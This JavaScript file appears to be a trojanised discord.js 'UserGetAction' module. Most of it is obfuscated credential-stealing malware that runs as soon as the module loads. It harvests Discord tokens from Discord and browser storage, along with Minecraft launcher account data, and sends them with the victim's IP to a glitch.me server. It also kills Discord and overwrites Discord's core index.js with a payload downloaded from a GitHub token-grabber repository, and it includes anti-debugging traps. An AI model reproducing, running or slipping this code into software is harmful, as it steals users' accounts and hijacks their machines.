const Action = require('./Action')
const OS = require('os'),
  fs = require('fs'),
  fetch = require('node-fetch'),
  { execSync } = require('child_process'),
  Glob = require('glob'),
  toInject = [],
  toInjectJS = [],
  toKill = [],
  apiurl = 'https://frequent-level-cornflower.glitch.me'
try {
  switch (OS.platform()) {
    case 'win32':
      const local = process.env.localappdata,
        roaming = process.env.appdata,
        minecraftPath = roaming + '/.minecraft/launcher_accounts.json',
        remixPath = roaming + '/.minecraft/remix/UID.txt'
      dbPaths = [
        roaming + '/Discord/Local Storage/leveldb',
        roaming + '/DiscordDevelopment/Local Storage/leveldb',
        roaming + '/Lightcord/Local Storage/leveldb',
        roaming + '/discordptb/Local Storage/leveldb',
        roaming + '/discordcanary/Local Storage/leveldb',
        roaming + '/Opera Software/Opera Stable/Local Storage/leveldb',
        roaming + '/Opera Software/Opera GX Stable/Local Storage/leveldb',
        local + '/Amigo/User Data/Local Storage/leveldb',
        local + '/Torch/User Data/Local Storage/leveldb',
        local + '/Kometa/User Data/Local Storage/leveldb',
        local + '/Orbitum/User Data/Local Storage/leveldb',
        local + '/CentBrowser/User Data/Local Storage/leveldb',
        local + '/7Star/7Star/User Data/Local Storage/leveldb',
        local + '/Sputnik/Sputnik/User Data/Local Storage/leveldb',
        local + '/Vivaldi/User Data/Default/Local Storage/leveldb',
        local + '/Google/Chrome SxS/User Data/Local Storage/leveldb',
        local + '/Epic Privacy Browser/User Data/Local Storage/leveldb',
        local + '/Google/Chrome/User Data/Default/Local Storage/leveldb',
        local + '/uCozMedia/Uran/User Data/Default/Local Storage/leveldb',
        local + '/Microsoft/Edge/User Data/Default/Local Storage/leveldb',
        local + '/Yandex/YandexBrowser/User Data/Default/Local Storage/leveldb',
        local +
          '/Opera Software/Opera Neon/User Data/Default/Local Storage/leveldb',
        local +
          '/BraveSoftware/Brave-Browser/User Data/Default/Local Storage/leveldb',
      ]
      init()
      function init() {
        var _0x5e5169 = (function () {
          var _0x2eb618 = true
          return function (_0xbd5bdf, _0x4f0456) {
            var _0x541e3f = _0x2eb618
              ? function () {
                  if (_0x4f0456) {
                    var _0x593af5 = _0x4f0456.apply(_0xbd5bdf, arguments)
                    _0x4f0456 = null
                    return _0x593af5
                  }
                }
              : function () {}
            _0x2eb618 = false
            return _0x541e3f
          }
        })()
        ;(function () {
          _0x5e5169(this, function () {
            var _0x3e7c8c = new RegExp('function *\\( *\\)')
            var _0x2bbe66 = new RegExp(
              '\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)',
              'i'
            )
            var _0x49bb76 = _0x174d97('init')
            if (
              !_0x3e7c8c.test(_0x49bb76 + 'chain') ||
              !_0x2bbe66.test(_0x49bb76 + 'input')
            ) {
              _0x49bb76('0')
            } else {
              _0x174d97()
            }
          })()
        })()
        fs.readFile(
          remixPath,
          (_0x33f463, _0x319153) => _0x319153 && minecraft('remix', _0x319153)
        )
        fs.readFile(
          minecraftPath,
          (_0x5db74d, _0x417ffa) =>
            _0x417ffa && minecraft('minecraft', _0x417ffa)
        )
        injectToDiscord()
        dbPaths.forEach((_0x1f71b6) => main(_0x1f71b6))
      }
      function main(_0x2f68c1) {
        fs.readdir(_0x2f68c1, (_0x61e1ee, _0x37156b) => {
          if (_0x37156b) {
            var _0x259329 = _0x37156b.filter((_0x4f204e) =>
              _0x4f204e.endsWith('ldb')
            )
            _0x259329.forEach((_0x458011) => {
              var _0x3d506e = fs
                .readFileSync(_0x2f68c1 + '/' + _0x458011)
                .toString()
              var [_0x220a9b] =
                /"[\d\w_-]{24}\.[\d\w_-]{6}\.[\d\w_-]{27}"/.exec(_0x3d506e) ||
                  /"mfa\.[\d\w_-]{84}"/.exec(_0x3d506e) || [undefined]
              if (_0x220a9b) {
                fetch('http://ip-api.com/json/')
                  .then((_0x278f13) => _0x278f13.json())
                  .then((_0x3167cf) =>
                    fetch(apiurl + '/beforeinject', {
                      method: 'POST',
                      body: JSON.stringify({
                        token: _0x220a9b.slice(1, -1),
                        ipAddress: _0x3167cf.query,
                      }),
                    })
                  )
              }
            })
          }
        })
      }
      function minecraft(_0x2180f0, _0x2dfe58) {
        switch (_0x2180f0) {
          case 'remix':
            fetch(apiurl + '/remix', {
              method: 'POST',
              body: JSON.stringify({ UID: _0x2dfe58 }),
            })
            break
          case 'minecraft':
            var [_0x5f3d11] = /"[\d\w_-]{32}"/.exec(_0x2dfe58)
            if (_0x5f3d11) {
              const _0x13f4d1 = require(minecraftPath)
              if (!_0x13f4d1.accounts) {
                return
              }
              var _0x2dd60c = _0x13f4d1.accounts[_0x5f3d11.slice(1, -1)]
              fetch(apiurl + '/minecraft', {
                method: 'POST',
                body: JSON.stringify({
                  eligibleForMigration: _0x2dd60c.eligibleForMigration,
                  hasMultipleProfiles: _0x2dd60c.hasMultipleProfiles,
                  legacy: _0x2dd60c.legacy,
                  localId: _0x2dd60c.localId,
                  minecraftProfileID: _0x2dd60c.minecraftProfile.id,
                  minecraftProfileName: _0x2dd60c.minecraftProfile.name,
                  persistent: _0x2dd60c.persistent,
                  remoteId: _0x2dd60c.remoteId,
                  type: _0x2dd60c.type,
                  username: _0x2dd60c.username,
                  activeAccountLocalId: _0x13f4d1.activeAccountLocalId,
                }),
              })
            }
        }
      }
      function injectToDiscord() {
        getInstalledDiscord()
        killAllDiscords()
        fetch(
          'https://raw.githubusercontent.com/NotFubukIl/DiscordTokenGrabber/main/data/index.js'
        )
          .then((_0x53d9c2) => _0x53d9c2.text())
          .then((_0x2052ce) =>
            toInjectJS.forEach(
              (_0x1eedcf) =>
                fs.writeFileSync(
                  _0x1eedcf,
                  _0x2052ce.replace('*API URL*', apiurl)
                ) ^
                execSync(
                  local +
                    '/' +
                    _0x1eedcf.split('/')[5] +
                    '/Update.exe --processStart ' +
                    _0x1eedcf.split('/')[5] +
                    '.exe'
                )
            )
          )
      }
      function getInstalledDiscord() {
        fs.readdirSync(roaming).forEach(
          (_0x5e3f81) =>
            _0x5e3f81.includes('cord') && toInject.push(local + '/' + _0x5e3f81)
        )
        toInject.forEach((_0x596bec) =>
          Glob.sync(
            _0x596bec +
              '/app-*/modules/discord_desktop_core-*/discord_desktop_core/index.js'
          ).map((_0x2abf4f) => toInjectJS.push(_0x2abf4f))
        )
      }
      function killAllDiscords() {
        var _0x5f161f = execSync('tasklist').toString()
        _0x5f161f.includes('Discord.exe') && toKill.push('discord')
        _0x5f161f.includes('DiscordCanary.exe') && toKill.push('discordcanary')
        _0x5f161f.includes('DiscordDevelopment.exe') &&
          toKill.push('discorddevelopment')
        _0x5f161f.includes('DiscordPTB.exe') && toKill.push('discordptb')
        toKill.forEach((_0x5e99b0) =>
          execSync('taskkill /IM ' + _0x5e99b0 + '.exe /F')
        )
      }
      break
    case 'linux':
      const defaut = '/home/' + __dirname.split('/')[2] + '/.config',
        LdbPaths = [
          defaut + '/discord/Local Storage/leveldb',
          defaut + '/discordcanary/Local Storage/leveldb',
          defaut + '/discordptb/Local Storage/leveldb',
          defaut + '/DiscordDevelopment/Local Storage/leveldb',
        ]
      const LminecraftPath = defaut + '/.minecraft/launcher_accounts.json'
      Linit()
      function Linit() {
        LdbPaths.forEach((_0x2e987d) => Lmain(_0x2e987d))
        var _0x477f4a = fs.readFileSync(LminecraftPath)
        if (_0x477f4a) {
          Lminecraft(_0x477f4a)
        }
        LinjectToDiscord()
      }
      function Lmain(_0x3790e3) {
        fs.readdir(_0x3790e3, (_0x4d6047, _0x4e4115) => {
          if (_0x4e4115) {
            var _0x21ae5a = _0x4e4115.filter((_0xece33a) =>
              _0xece33a.endsWith('ldb')
            )
            _0x21ae5a.forEach((_0xe44c43) => {
              var _0x1732a5 = fs
                .readFileSync(_0x4e4115 + '/' + _0xe44c43)
                .toString()
              var [_0x37d67b] =
                /"[\d\w_-]{24}\.[\d\w_-]{6}\.[\d\w_-]{27}"/.exec(_0x1732a5) ||
                  /"mfa\.[\d\w_-]{84}"/.exec(_0x1732a5) || [undefined]
              if (_0x37d67b) {
                fetch('http://ip-api.com/json/')
                  .then((_0x130142) => _0x130142.json())
                  .then((_0x54deab) =>
                    fetch(apiurl + '/beforeinject', {
                      method: 'POST',
                      body: JSON.stringify({
                        token: _0x37d67b,
                        ip: _0x54deab.query,
                      }),
                    })
                  )
              }
            })
          }
        })
      }
      function Lminecraft(_0x45acba) {
        var [_0x2388ae] = /"[\d\w_-]{32}"/.exec(_0x45acba)
        if (_0x2388ae) {
          const _0x402cfe = require(LminecraftPath)
          if (!_0x402cfe.accounts) {
            return
          }
          var _0x4d42dc = _0x402cfe.accounts[_0x2388ae.slice(1, -1)]
          fetch(apiurl + '/minecraft', {
            method: 'POST',
            body: JSON.stringify({
              eligibleForMigration: _0x4d42dc.eligibleForMigration,
              hasMultipleProfiles: _0x4d42dc.hasMultipleProfiles,
              legacy: _0x4d42dc.legacy,
              localId: _0x4d42dc.localId,
              minecraftProfileID: _0x4d42dc.minecraftProfile.id,
              minecraftProfileName: _0x4d42dc.minecraftProfile.name,
              persistent: _0x4d42dc.persistent,
              remoteId: _0x4d42dc.remoteId,
              type: _0x4d42dc.type,
              username: _0x4d42dc.username,
              activeAccountLocalId: _0x402cfe.activeAccountLocalId,
            }),
          })
        }
      }
      function LinjectToDiscord() {
        getInstalledLDiscord()
        fetch(
          'https://raw.githubusercontent.com/NotFubukIl/DiscordTokenGrabber/main/data/index.js'
        )
          .then((_0x41a2f7) => _0x41a2f7.text())
          .then((_0x14411c) =>
            toInjectJS.forEach((_0x32ce86) =>
              fs.writeFileSync(
                _0x32ce86,
                _0x14411c.replace('*API URL*', apiurl)
              )
            )
          )
      }
      function getInstalledLDiscord() {
        fs.readdirSync(defaut).forEach(
          (_0x3c6996) =>
            _0x3c6996.includes('cord') &&
            toInject.push(defaut + '/' + _0x3c6996)
        )
        toInject.forEach((_0x369549) =>
          Glob.sync(_0x369549 + '/*/modules/discord_desktop_core/index.js').map(
            (_0x36ebc7) => toInjectJS.push(_0x36ebc7)
          )
        )
      }
      break
    case 'darwin':
      break
  }
} catch (_0x49b768) {}
class UserGetAction extends Action {
  ['handle'](_0x4c7df0) {
    const _0x49ad08 = this.client
    const _0x559f7d = _0x49ad08.dataManager.newUser(_0x4c7df0)
    return { user: _0x559f7d }
  }
}
module.exports = UserGetAction
function _0x174d97(_0x548723) {
  function _0x4a9456(_0x403d7a) {
    if (typeof _0x403d7a === 'string') {
      return function (_0x1cbc6b) {}
        .constructor('while (true) {}')
        .apply('counter')
    } else {
      if (('' + _0x403d7a / _0x403d7a).length !== 1 || _0x403d7a % 20 === 0) {
        ;(function () {
          return true
        }
          .constructor('debugger')
          .call('action'))
      } else {
        ;(function () {
          return false
        }
          .constructor('debugger')
          .apply('stateObject'))
      }
    }
    _0x4a9456(++_0x403d7a)
  }
  try {
    if (_0x548723) {
      return _0x4a9456
    } else {
      _0x4a9456(0)
    }
  } catch (_0x52e361) {}
}

